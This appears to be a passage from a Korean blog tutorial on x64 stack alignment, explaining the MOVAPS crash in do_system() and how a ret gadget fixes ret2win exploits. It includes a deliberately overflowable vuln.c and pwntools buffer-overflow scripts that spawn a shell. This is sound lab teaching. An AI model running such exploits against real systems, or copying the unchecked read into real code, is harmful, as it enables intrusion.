<p>&#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xB41C; <code>main()</code> &#xD568;&#xC218;&#xC758; entry point&#xC785;&#xB2C8;&#xB2E4;. &#xC544;&#xC9C1; &#xD504;&#xB864;&#xB85C;&#xADF8;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC804;&#xC774;&#xB2C8; RSP+8&#xC740; 16&#xC758; &#xBC30;&#xC218;&#xACA0;&#xC8E0;?</p>
<p>RSP : <code>0x7fffffffe038</code></p>
<p>RSP+8 : <code>0x7fffffffe040</code></p>
<p>&#xC704; &#xC2A4;&#xD06C;&#xB9B0;&#xC0F7;&#xC744; &#xBCF4;&#xBA74; RSP+8&#xC740; <code>0x7fffffffe040</code>&#xC774;&#xBBC0;&#xB85C; 16&#xC758; &#xBC30;&#xC218;&#xAC00; &#xB9DE;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/9.png" srcset="/img/loading.gif" alt></p>
<p>&#xADF8;&#xB7FC; &#xB2E4;&#xB4E4; &#xC54C;&#xB2E4;&#xC2DC;&#xD53C; call &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC73C;&#xB85C; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; stack&#xC5D0; return address&#xB97C; push &#xD558;&#xB2C8;&#xAE4C; call &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC9C1;&#xC804;&#xC5D4; RSP&#xAC00; 16&#xC758; &#xBC30;&#xC218;&#xACA0;&#xC8E0;?</p>
<p>RSP : <code>0x7fffffffe030</code></p>
<p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/10.png" srcset="/img/loading.gif" alt></p>
<p>&#xADF8;&#xB9AC;&#xACE0; &#xD568;&#xC218; &#xD504;&#xB864;&#xB85C;&#xADF8;&#xC5D0;&#xC11C; <code>push rbp</code>&#xB97C; &#xD558;&#xB2C8;&#xAE4C; rbp&#xB294; &#xD56D;&#xC0C1; 16&#xC758; &#xBC30;&#xC218;&#xACA0;&#xB124;&#xC694;?</p>
<p>RSP : <code>0x7ffffffffdfe0</code></p>
<p>&#xB300;&#xCDA9; &#xC815;&#xB9AC;&#xD574;&#xBCF4;&#xBA74; stack align&#xC744; &#xC9C0;&#xD0A4;&#xBA74;&#xC11C; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xD750;&#xB984;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<ol>
<li>call &#xC2E4;&#xD589; &#xC9C1;&#xC804; RSP&#xB294; 16&#xC758; &#xBC30;&#xC218; ( stack align O )</li>
<li>&#xD568;&#xC218;&#xC758; entry point&#xC5D0;&#xC120; RSP+8&#xC774; 16&#xC758; &#xBC30;&#xC218; ( stack align X )</li>
<li>&#xD568;&#xC218;&#xC758; &#xD504;&#xB864;&#xB85C;&#xADF8; &#xC2E4;&#xD589; &#xD6C4; RSP&#xB294; 16&#xC758; &#xBC30;&#xC218; ( stack align O )</li>
<li>RBP&#xB294; &#xD56D;&#xC0C1; 16&#xC758; &#xBC30;&#xC218; ( stack align O )</li>
</ol>
<p>&#xC0AC;&#xC2E4;, &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD560; &#xB54C; 2&#xBC88; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC7A0;&#xC2DC; stack align&#xC774; &#xAE68;&#xC9C0;&#xACE0; 3&#xBC88;&#xC5D0;&#xC11C; &#xB2E4;&#xC2DC; stack align&#xC774; &#xB9DE;&#xCDB0;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; 2&#xBC88;&#xB9CC; &#xB611; &#xB5BC;&#xC11C; &#x201C;&#xC774; &#xAC83;&#xB9CC; &#xC9C0;&#xD0A4;&#xC2DC;&#xBA74; stack align&#xC785;&#xB2C8;&#xB2E4;.&#x201D;&#xB77C;&#xACE0; &#xC124;&#xBA85;&#xC744; &#xC368;&#xB194;&#xC11C; &#xD5F7;&#xAC08;&#xB9AC;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;. &#xC774;&#xB798;&#xB3C4; &#xC774;&#xD574; &#xC548; &#xB418;&#xC2DC;&#xBA74; 4&#xBC88;&#xB9CC; &#xAE30;&#xC5B5;&#xD558;&#xC138;&#xC694;. 4&#xBC88;&#xB9CC; &#xC2E0;&#xACBD; &#xC368;&#xC918;&#xB3C4; &#xACF5;&#xACA9; &#xCF54;&#xB4DC;&#xB97C; &#xC9DC;&#xB294;&#xB370; &#xC544;&#xBB34; &#xC9C0;&#xC7A5;&#xC774; &#xC5C6;&#xC744; &#xAC81;&#xB2C8;&#xB2E4;. &#xB354; &#xC790;&#xC138;&#xD55C; &#xC124;&#xBA85;&#xC740; &#xC870;&#xAE08; &#xC774;&#xB530; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
<h1 id="MOVAPS"><a href="#MOVAPS" class="headerlink" title="MOVAPS"></a>MOVAPS</h1><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/11.png" srcset="/img/loading.gif" alt></p>
<p>&#xC774; &#xADDC;&#xCE59;&#xC744; &#xAF2D; &#xC9C0;&#xCF1C;&#xC57C; &#xD558;&#xB294;&#xAC00;? &#xBB3C;&#xB860; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. &#xBC29;&#xAE08; &#xC804;&#xC5D0;&#xB3C4; &#xC124;&#xBA85;&#xD588;&#xB4EF;&#xC774; &#xC720;&#xC5F0;&#xD558;&#xAC8C; &#xC5B4;&#xACBC;&#xB2E4;&#xAC00; &#xC9C0;&#xCF30;&#xB2E4;&#xAC00; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; stack alignment&#xB294; &#xD6A8;&#xC728;&#xC744; &#xB192;&#xC774;&#xAE30; &#xC704;&#xD574; &#xC720;&#xC9C0;&#xD55C;&#xB2E4;&#xACE0;&#xB3C4; &#xC124;&#xBA85;&#xD588;&#xB2E4;&#xC2DC;&#xD53C; &#xC9C0;&#xD0A4;&#xC9C0; &#xC54A;&#xC544;&#xB3C4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xB3D9;&#xC791;&#xD558;&#xB294;&#xB370; &#xC544;&#xBB34; &#xBB38;&#xC81C;&#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB9CC; &#xD6A8;&#xC728;&#xC774; &#xC880; &#xB5A8;&#xC5B4;&#xC9C8; &#xBFD0;&#x2026; &#xBB3C;&#xB860; &#xC608;&#xC678;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xB370; &#xBA87;&#xBA87; intel/AMD cpu&#xC5D0;&#xC11C; SSE instruction&#xC744; &#xC2E4;&#xD589;&#xD560; &#xB54C;  stack alignment&#xAC00; &#xAE68;&#xC838;&#xC788;&#xC73C;&#xBA74; segmentation fault&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/12.png" srcset="/img/loading.gif" alt></p>
<p>&#xADF8;&#xB9AC;&#xACE0; <a target="_blank" rel="external nofollow noopener noreferrer" href="http://qcd.phys.cmu.edu/QCDcluster/intel/vtune/reference/vc181.htm">MOVAPS</a>&#xAC00; &#xBC14;&#xB85C; SSE intruction &#xC911; &#xD558;&#xB098;&#xC785;&#xB2C8;&#xB2E4;. XMM &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB07C;&#xB9AC; &#xD639;&#xC740; XMM &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC640; &#xBA54;&#xBAA8;&#xB9AC; &#xC0AC;&#xC774;&#xC5D0;&#xC11C; double quadword( 16byte ) &#xD06C;&#xAE30;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC62E;&#xAE30;&#xB294; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC778;&#xB370;, &#xBA54;&#xBAA8;&#xB9AC;&#xC758; align &#xC5EC;&#xBD80;&#xB97C; &#xAC15;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.</p>
<pre><code class="hljs c">&lt;do_system+<span class="hljs-number">364</span>&gt; movaps xmmword ptr [rsp + <span class="hljs-number">0x50</span>], xmm0</code></pre>
<p>XMM &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC640; &#xBA54;&#xBAA8;&#xB9AC; &#xC0AC;&#xC774;&#xC5D0;&#xC11C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC62E;&#xAE38; &#xB54C;, &#xBA54;&#xBAA8;&#xB9AC;&#xC758; align&#xC774; &#xAE68;&#xC838;&#xC788;&#xC73C;&#xBA74; general protection( #GP / SIGSEGV ) fault&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; Ubuntu 18.04&#xBD80;&#xD130; &#xC774; movaps &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC774; <code>do_system()</code>&#xC744; &#xD3EC;&#xD568;&#xD55C; &#xC5EC;&#xB7EC; &#xBA40;&#xD2F0;&#xBBF8;&#xB514;&#xC5B4; &#xC624;&#xD37C;&#xB808;&#xC774;&#xC158;&#xC5D0; &#xCD94;&#xAC00;&#xB418;&#xC5B4; exploit&#xC744; &#xC791;&#xC131;&#xD560; &#xB54C; stack alignment&#xB97C; &#xC2E0;&#xACBD; &#xC368;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p>
<h1 id="JMP-vs-CALL-vs-RET"><a href="#JMP-vs-CALL-vs-RET" class="headerlink" title="JMP vs CALL vs RET"></a>JMP vs CALL vs RET</h1><p>&#xADF8;&#xB798;&#xC11C; Exploit&#xC774;&#xB791; stack align&#xC774; &#xAE68;&#xC9C0;&#xB294; &#xAC70;&#xB791; &#xBB34;&#xC2A8; &#xC0C1;&#xAD00;&#xC778;&#xB370;? &#xADF8;&#xB798;&#xC11C; &#xC65C; 16.04&#xC5D0;&#xC120; &#xC258;&#xC744; &#xB744;&#xC6B0;&#xB358; &#xACF5;&#xACA9; &#xCF54;&#xB4DC;&#xAC00; 18.04&#xBD80;&#xD134; &#xC791;&#xB3D9; &#xC548; &#xD558;&#xB294; &#xAC74;&#xB370;? &#xC774;&#xAC70;&#xB97C; &#xC774;&#xD574;&#xD558;&#xB824;&#xBA74; &#xC6B0;&#xC120; control intsruction&#xB4E4;&#xC758; &#xCC28;&#xC774;&#xB97C; &#xC54C;&#xC544;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xBAA8;&#xB974;&#xB294; &#xC0AC;&#xB78C;&#xC774; &#xB9CE;&#xB354;&#xB77C;&#xACE0;&#x2026; &#xAC01; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xB9C8;&#xB2E4; &#xC2A4;&#xD0DD;&#xC758; &#xBCC0;&#xD654;, &#xB354; &#xC790;&#xC138;&#xD788; &#xB9D0;&#xD558;&#xC790;&#xBA74; RSP&#xC758; &#xBCC0;&#xD654;&#xAC00; &#xC5B4;&#xB5A4;&#xC9C0; &#xC54C;&#xC544;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p>
<h2 id="1-JMP"><a href="#1-JMP" class="headerlink" title="1. JMP"></a>1. JMP</h2><blockquote>
<p>Transfers program control to a different point in the instruction stream <strong>without</strong> recording <strong>return information</strong>.</p>
</blockquote>
<p>&#xB2E8;&#xC21C;&#xD788; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xD750;&#xB984;&#xC744; &#xC62E;&#xAE40;. &#xC778;&#xC6A9;&#xAD6C;&#xB97C; &#xBCF4;&#xBA74; &#xC54C;&#xACA0;&#xC9C0;&#xB9CC; &#xB9AC;&#xD134; &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. jmp &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xC2A4;&#xD0DD;&#xC758; &#xBCC0;&#xD654;&#xB294; &#xC5C6;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p>
<h2 id="2-CALL"><a href="#2-CALL" class="headerlink" title="2. CALL"></a>2. CALL</h2><p>&#xBC18;&#xBA74; call &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xD750;&#xB984;&#xC744; &#xC62E;&#xAE30;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2C8;&#xB77C; subroutine&#xC5D0; &#xC7A0;&#xC2DC; &#xB4E4;&#xB800;&#xB2E4;&#xAC00; &#xB3CC;&#xC544;&#xC624;&#xB294; &#xAC83;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9AC;&#xD134; &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xADF8; &#xB9AC;&#xD134; &#xC815;&#xBCF4;&#xB294; stack&#xC5D0; push &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; call &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC744; &#xC2E4;&#xD589;&#xD55C; &#xB4A4;&#xC5D4; RSP&#xC758; &#xAC12;&#xC774; 8&#xB9CC;&#xD07C; &#xAC10;&#xC18C;&#xD569;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/13.png" srcset="/img/loading.gif" alt></p>
<p>RSP : <code>0x7fffffffe030</code></p>
<p>call hello &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xBA74; <main+18>&#xC744; stack&#xC5D0; push &#xD558;&#xACA0;&#xC8E0;?</main+18></p>
<p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/14.png" srcset="/img/loading.gif" alt></p>
<p>RSP : <code>0x7fffffffe028</code></p>
<p>&#xB530;&#xB77C;&#xC11C; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xB41C; &#xD568;&#xC218;&#xC758; entry point&#xC5D0;&#xC120; RSP+8&#xC774; 16&#xC758; &#xBC30;&#xC218;&#xAC00; &#xB418;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; &#xAF2D; &#xAE30;&#xC5B5;&#xD558;&#xC154;&#xC57C; &#xD560; &#xAC83;&#xC774; Call&#xC744; &#xC2E4;&#xD589;&#xD55C; &#xC9C1;&#xD6C4;&#xC5D4; &#xC77C;&#xC2DC;&#xC801;&#xC73C;&#xB85C; stack align&#xC774; &#xAE68;&#xC9C4;&#xB2E4;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;.</p>
<h2 id="3-RET"><a href="#3-RET" class="headerlink" title="3. RET"></a>3. RET</h2><pre><code class="hljs c">pop rip
jmp rip</code></pre>
<p>call&#xC744; &#xC124;&#xBA85;&#xD560; &#xB54C; sub routine&#xC5D0; &#xC7A0;&#xC2DC; &#xB4E4;&#xB800;&#xB2E4; &#xB3CC;&#xC544;&#xAC04;&#xB2E4;&#xACE0; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB3C;&#xB860; &#xC774; &#xBAA8;&#xB4E0; &#xB3D9;&#xC791;&#xC744; call&#xC774; &#xB2E4; &#xD558;&#xC9C4; &#xC54A;&#xACE0;, &#xC6D0;&#xB798;&#xC758; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158; &#xC2A4;&#xD2B8;&#xB9BC;&#xC73C;&#xB85C; &#xB2E4;&#xC2DC; &#xB3CC;&#xC544;&#xAC00;&#xB294; &#xB3D9;&#xC791;&#xC740;  ret&#xC774; &#xB300;&#xC2E0;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p>
<p>ret&#xC740; &#xB450; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC744; &#xD558;&#xB098;&#xB85C; &#xD569;&#xCCD0; &#xB1A8;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xB418;&#xB294;&#xB370;, call&#xC774; &#xC800;&#xC7A5;&#xD574;&#xB193;&#xC740; &#xB9AC;&#xD134; &#xC815;&#xBCF4;&#xB97C; &#xC2A4;&#xD0DD;&#xC5D0;&#xC11C; &#xBE7C;&#xB0B4;&#xC5B4; jmp &#xD569;&#xB2C8;&#xB2E4;. &#xC989;, RSP&#xAC12;&#xC774; 8&#xB9CC;&#xD07C; &#xC99D;&#xAC00;&#xD55C;&#xB2E4;&#xB294; &#xB73B;&#xC785;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/15.png" srcset="/img/loading.gif" alt></p>
<p>RSP : <code>0x7fffffffe028</code></p>
<p>&#xC704; &#xC2A4;&#xD06C;&#xB9B0;&#xC0F7;&#xC740; ret&#xC744; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC9C1;&#xC804;&#xC758; &#xC0C1;&#xD669;&#xC785;&#xB2C8;&#xB2E4;. RSP &#xAC12;&#xC744; &#xBCF4;&#xBA74; &#xC544;&#xC2DC;&#xACA0;&#xC9C0;&#xB9CC; ret&#xC744; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC9C1;&#xC804;&#xC5D4; stack align&#xC774; &#xAE68;&#xC838;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xD568;&#xC218; &#xC5D0;&#xD544;&#xB85C;&#xADF8;&#xC758; leave &#xBA85;&#xB839;&#xC5B4; &#xD639;&#xC740; pop rbp&#xC758; &#xACB0;&#xACFC;&#xACA0;&#xC8E0;?</p>
<p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/16.png" srcset="/img/loading.gif" alt></p>
<p>RSP : <code>0x7fffffffe030</code></p>
<p>&#xADF8;&#xB9AC;&#xACE0; ret&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74; RSP&#xAC00; 8&#xB9CC;&#xD07C; &#xC99D;&#xAC00;&#xD558;&#xACE0; stack align&#xC774; &#xB2E4;&#xC2DC; &#xB9DE;&#xCDB0;&#xC9D1;&#xB2C8;&#xB2E4;.</p>
<h2 id="&#xC815;&#xB9AC;"><a href="#&#xC815;&#xB9AC;" class="headerlink" title="&#xC815;&#xB9AC;"></a>&#xC815;&#xB9AC;</h2><ul>
<li>call : RSP-=8 &#x2192; &#xC77C;&#xC2DC;&#xC801;&#xC73C;&#xB85C; stack align&#xC744; &#xAE78;</li>
<li>ret : RSP+=8 &#x2192; leave &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xAE68;&#xC9C4; stack align&#xC744; &#xB2E4;&#xC2DC; &#xB9DE;&#xCDA4;</li>
</ul>
<h1 id="Abnormal-call"><a href="#Abnormal-call" class="headerlink" title="Abnormal call"></a>Abnormal call</h1><p>&#xC790; &#xC774;&#xCBE4; &#xB418;&#xBA74; &#xB300;&#xCDA9; &#xB208;&#xCE58;&#xCC44;&#xC168;&#xC744; &#xAC70; &#xAC19;&#xC740;&#xB370;, BOF&#xACF5;&#xACA9;&#xC744; &#xD560; &#xB54C; ret&#xC73C;&#xB85C; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC8E0;? shellcode&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC74; &#xB17C;&#xC678;&#xB85C; &#xCE58;&#xACE0;, ret2libc( RTL )&#xB098; ROP&#xB85C; BOF exploit&#xC744; &#xD558;&#xAC8C; &#xB420; &#xD150;&#xB370; call&#xC774; &#xC544;&#xB2C8;&#xB77C; ret&#xC73C;&#xB85C; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; stack alignment&#xAC00; &#xAE68;&#xC9C0;&#xAC8C; &#xB418;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;.</p>
<h2 id="vuln-c"><a href="#vuln-c" class="headerlink" title="vuln.c"></a>vuln.c</h2><pre><code class="hljs c"><span class="hljs-comment">// vuln.c</span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">win</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>{
	system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>{
	<span class="hljs-keyword">char</span> buf[<span class="hljs-number">16</span>];
	
	read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">128</span>);
	
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
$ gcc -o vuln vuln.c -no-pie -fno-<span class="hljs-built_in">stack</span>-protector</code></pre>
<p>&#xC815;&#xB9D0; &#xAC04;&#xB2E8;&#xD55C; BOF &#xC608;&#xC81C;&#xB85C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xC8E0;. vuln.c&#xB97C; &#xC791;&#xC131;&#xD558;&#xACE0; &#xCEF4;&#xD30C;&#xC77C;&#xD574;&#xC90D;&#xC2DC;&#xB2E4;. BOF&#xB97C; &#xD560; &#xAC70;&#xB2C8;&#xAE4C; &#xB2F9;&#xC5F0;&#xD788; stack canary&#xB294; &#xD574;&#xC81C;&#xD574;&#xC8FC;&#xC138;&#xC694;.</p>
<h2 id="bof-py"><a href="#bof-py" class="headerlink" title="bof.py"></a>bof.py</h2><pre><code class="hljs python"><span class="hljs-comment"># bof.py</span>

<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*

p = process(<span class="hljs-string">&apos;./vuln&apos;</span>)

gdb.attach(p)

win = <span class="hljs-number">0x401156</span>

payload = <span class="hljs-string">b&apos;A&apos;</span>*<span class="hljs-number">24</span> + p64(win)

p.sendline(payload)
p.interactive()
$ python3 bof.py</code></pre>
<p><code>main()</code>&#xC758; return &#xC8FC;&#xC18C;&#xB97C; <code>win()</code> &#xD568;&#xC218;&#xC758; entry point&#xB85C; &#xB36E;&#xC5B4;&#xC4F0;&#xB294; &#xACF5;&#xACA9; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.</p>
<h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/17.png" srcset="/img/loading.gif" alt></p>
<pre><code class="hljs bash">pwndbg&gt; bp main+45
pwndbg&gt; c</code></pre>
<p><code>main()</code>&#xC758; ret&#xC5D0; break point&#xB97C; &#xAC78;&#xACE0; <code>win()</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB41C; &#xD6C4;&#xC758; stack &#xC0C1;&#xD669;&#xC744; &#xBD05;&#xC2DC;&#xB2E4;.</p>
<p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/18.png" srcset="/img/loading.gif" alt></p>
<pre><code class="hljs bash">pwndbg&gt; ni</code></pre>
<p>ret&#xC73C;&#xB85C; &#xD568;&#xC218; <code>win()</code>&#xC758; entry point&#xC5D0; &#xB3C4;&#xB2EC;&#xD574;&#xC11C; &#xD504;&#xB864;&#xB85C;&#xADF8;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xB098;&#xBA74; stack alignment&#xAC00; &#xAE68;&#xC9C0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/19.png" srcset="/img/loading.gif" alt></p>
<p>&#xCEF4;&#xD4E8;&#xD130;&#xB294; stack&#xC774; &#xD56D;&#xC0C1; align &#xB3FC;&#xC788;&#xB2E4;&#xACE0; &#xAC00;&#xC815;&#xD558;&#xACE0; &#xADF8; &#xC0C1;&#xD0DC;&#xB97C; &#xC720;&#xC9C0;&#xD558;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xC989;, <code>win()</code>&#xC5D0;&#xC11C; &#xAE68;&#xC838;&#xBC84;&#xB9B0; alignment&#xB97C; &#xAE68;&#xC9C4; &#xC0C1;&#xD0DC;&#xB85C; &#xC720;&#xC9C0;&#xD558;&#xAC8C; &#xB418;&#xACE0;, <code>win()</code> &#xC774;&#xD6C4;&#xC5D0; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xD568;&#xC218;&#xB4E4;&#xC758; stack alignment&#xB294; &#xAE68;&#xC9C4; &#xC0C1;&#xD0DC;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</p>
<p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/20.png" srcset="/img/loading.gif" alt></p>
<p>&#xADF8;&#xB9AC;&#xACE0; &#xACB0;&#xAD6D; <code>do_system()</code>&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB2E4; movaps&#xC5D0; &#xAC78;&#xB824; segmentation fault&#xB97C; &#xB744;&#xC6B0;&#xACE0; exploit&#xC740; &#xC2E4;&#xD328;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>
<h1 id="RET-sled"><a href="#RET-sled" class="headerlink" title="RET sled"></a>RET sled</h1><p>&#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#xC124;&#xBA85;&#xD55C; &#xB0B4;&#xC6A9;&#xC744; &#xC774;&#xD574;&#xD558;&#xC168;&#xB2E4;&#xBA74; &#xC55E;&#xC73C;&#xB85C; &#xACF5;&#xACA9; &#xCF54;&#xB4DC;&#xB97C; &#xC9DC;&#xC2E4; &#xB54C; &#xC544;&#xBB34; &#xBB38;&#xC81C;&#xC5C6;&#xC744; &#xAC70;&#xB77C; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xB3C4; &#xC5EC;&#xAE30;&#xC11C; &#xAE00;&#xC744; &#xB9C8;&#xBB34;&#xB9AC; &#xC9D3;&#xAE34; &#xC560;&#xB9E4;&#xD558;&#xB2C8; &#xD574;&#xACB0; &#xBC29;&#xBC95;&#xC744; &#xC54C;&#xC544;&#xBCF4;&#xC8E0;.</p>
<pre><code class="hljs python"><span class="hljs-comment">#bof2.py</span>

<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*

p = process(<span class="hljs-string">&apos;./vuln&apos;</span>)

win = <span class="hljs-number">0x401156</span>
ret = <span class="hljs-number">0x40119a</span> <span class="hljs-comment"># ret sled</span>

payload = <span class="hljs-string">b&apos;A&apos;</span>*<span class="hljs-number">24</span> + p64(ret) + p64(win)

p.sendline(payload)
p.interactive()</code></pre>
<p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/21.png" srcset="/img/loading.gif" alt></p>
<pre><code class="hljs bash">$ python3 bof2.py</code></pre>
<p>&#xB124;. &#xC815;&#xB9D0; &#xBCC4;&#xAC70; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. ret &#xAC00;&#xC82F;&#xC744; &#xD558;&#xB098; &#xB354; &#xCD94;&#xAC00;&#xD574;&#xC11C; RSP&#xC758; &#xC704;&#xCE58;&#xB97C; 8&#xB9CC;&#xD07C; &#xC870;&#xC815;&#xD574;&#xC8FC;&#xBA74; BOF &#xACF5;&#xACA9;&#xC744; &#xD560; &#xB54C; stack alignment&#xB97C; &#xC720;&#xC9C0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB108;&#xBB34; &#xB2E8;&#xC21C;&#xD558;&#xACE0; &#xB2F9;&#xC5F0;&#xD574;&#xC11C; &#xB354; &#xC124;&#xBA85;&#xD560; &#xAC8C; &#xC5C6;&#xB124;&#xC694;.</p>
<p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/22.png" srcset="/img/loading.gif" alt></p>
<p>&#xC9E0;!</p>
